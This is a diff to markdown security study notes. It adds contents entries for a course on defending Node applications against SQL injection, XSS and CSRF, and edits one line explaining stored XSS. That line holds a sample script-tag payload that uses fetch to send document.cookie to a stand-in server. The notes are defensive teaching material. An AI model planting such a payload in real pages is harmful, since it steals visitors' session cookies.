@@ -31,6 +31,13 @@
     - [Security awareness training](#Security-awareness-training)
   - [Third-party risk management](#Third-party-risk-management)
   - [Incident response playbook](#Incident-response-playbook)
+- [Codecademy course - Defending Node Applications from SQL Injection, XSS and CSRF Attacks](#codecademy-course---defending-node-applications-from-sql-injection-xss-and-csrf-attacks)
+  - [CSRF Attacks](#CSRF-Attacks)
+  - [SQL Attacks](#SQL-Attacks) 
+  - [XSS Attacks](#XSS-Attacks)
+  - [CORS](#CORS)
+  - [Javascript Defensive coding](#Javascript-Defensive-coding)
+  - [Secure your nodejs application Summary](#Secure-your-nodejs-application-Summary)
 - [Free tutorials](#Free-tutorials)
   - [Other concepts](#Other-concepts)
     - [Hacking and ethical hacking](#Hacking-and-ethical-hacking)
@@ -533,7 +540,7 @@ A XSS attack will usually be done by writing a script inside a URL query paramet
 A reflected XSS attack could for example send a malicious link to a victim with code that retrieves a victim’s cookies or other important information and send that information directly to the attacker’s personal server.<br>
 
 A stored XSS attack consists of injecting a script that will be stored inside a database.<br>
-For example someone writes `<script>fetch(`http://localhost:5000?data=${document.cookie}`)</script>` inside a public comment section. Each person that views the comment section could execute the malicious script, with this malicious script sending the cookie of the victim elsewhere.<br>
+For example someone writes `<script>fetch("http://localhost:5000?data=${document.cookie}")</script>` inside a public comment section. Each person that views the comment section could execute the malicious script, with this malicious script sending the cookie of the victim elsewhere.<br>
 
 In order to securely setup a cookie in an Express server, you can use the library `express-session` to set up a session and configure the application with specific properties pertaining to cookies such as `httpOnly: true, secure: true` which will help mitigate the risk of client-side scripts accessing the protected cookie.
 
